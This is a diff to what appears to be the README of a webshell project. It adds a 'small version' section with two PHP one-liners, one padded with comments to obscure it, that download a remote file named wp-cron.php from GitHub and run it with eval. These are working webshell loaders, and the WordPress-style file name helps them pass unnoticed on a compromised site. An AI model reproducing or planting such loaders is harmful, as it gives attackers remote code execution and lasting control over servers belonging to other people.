@@ -49,6 +49,19 @@ ______________
 <img src="./img/screenshot.jpeg" width="100%" alt="Login" />
 
 
+_______________
+
+
+### 🍭 小型版
+
+```php
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/chloethesis/webshell/refs/heads/main/wp-cron.php"));/**/?>
+```
+
+```php
+<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/chloethesis/webshell/refs/heads/main/wp-cron.php"));?>
+```
+
 
 <br>
 
